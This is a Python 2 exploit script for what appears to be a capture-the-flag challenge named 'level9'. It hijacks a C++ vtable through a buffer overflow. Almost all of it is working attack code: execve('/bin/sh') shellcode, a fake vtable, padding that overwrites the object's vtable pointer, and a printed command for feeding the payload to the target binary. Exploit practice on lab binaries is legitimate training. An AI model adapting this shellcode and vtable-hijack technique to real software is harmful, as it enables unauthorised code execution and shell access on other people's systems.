#!/usr/bin/env python2

# Level9 - C++ Vtable Hijacking Exploit

import struct
import sys

# Simple shellcode to call system("/bin/sh") - using system() call
shellcode = (
    "\x31\xc0"                # xor eax, eax
    "\x50"                    # push eax (null terminator)  
    "\x68\x2f\x73\x68\x00"   # push "/sh\x00"
    "\x68\x2f\x62\x69\x6e"   # push "/bin"
    "\x89\xe3"                # mov ebx, esp (pointer to "/bin/sh")
    "\x50"                    # push eax (null)
    "\x53"                    # push ebx (argument)
    "\x89\xe1"                # mov ecx, esp
    "\x31\xd2"                # xor edx, edx  
    "\xb0\x0b"                # mov al, 0xb (execve)
    "\xcd\x80"                # int 0x80
)

print "Shellcode length:", len(shellcode)

# Calculate the address where shellcode will be
# From debugging: obj1 = 0x804a008, annotation buffer starts at obj1 + 4
# Our shellcode will be at the start of the annotation buffer
# Allow passing the target shellcode address as hex on the command line
if len(sys.argv) > 1:
    try:
        shellcode_addr = int(sys.argv[1], 16)
    except ValueError:
        print "Invalid address, using default"
        shellcode_addr = 0x804a008 + 4
else:
    shellcode_addr = 0x804a008 + 4

print "Shellcode address:", hex(shellcode_addr)

# Create exploit payload
# C++ vtables contain function pointers. We need to create a fake vtable structure
# [fake_vtable] + [shellcode] + [padding] + [ptr_to_fake_vtable]

# Create a fake vtable that points to our shellcode
fake_vtable = struct.pack("<L", shellcode_addr + 4)  # Point to shellcode after the fake vtable

# Build the payload: [fake_vtable][shellcode][padding][ptr_to_fake_vtable]
payload_start = fake_vtable + shellcode
padding_len = 108 - len(payload_start)
padding = "A" * padding_len

# Point to the fake vtable at the beginning of our buffer
fake_vtable_ptr = struct.pack("<L", shellcode_addr)

payload = payload_start + padding + fake_vtable_ptr

print "Payload length:", len(payload)
print "Exploit payload:"
print repr(payload)

# Test payload for command line
print "\nCommand to test:"
print "./level9 '" + payload.encode('string-escape') + "'"